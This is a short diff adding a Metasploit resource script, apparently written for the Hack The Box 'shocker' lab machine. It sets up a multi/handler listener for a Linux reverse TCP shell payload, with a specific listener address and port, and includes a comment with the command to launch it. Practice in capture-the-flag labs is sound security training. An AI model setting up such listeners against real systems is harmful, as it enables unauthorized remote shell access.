@@ -1,0 +1,9 @@
+#
+# [Kali 2.x]:   systemctl start postgresql; msfdb start; msfconsole -q -r '/home/heimdall/Documents/dev/Sec/hackmes/hackthebox-eu/shocker/linux-shell-stageless-reverse-tcp-14738-elf.rc'
+#
+use exploit/multi/handler
+set PAYLOAD linux/x86/shell_reverse_tcp
+set LHOST 10.10.14.88
+set LPORT 14738
+set ExitOnSession false
+run -j
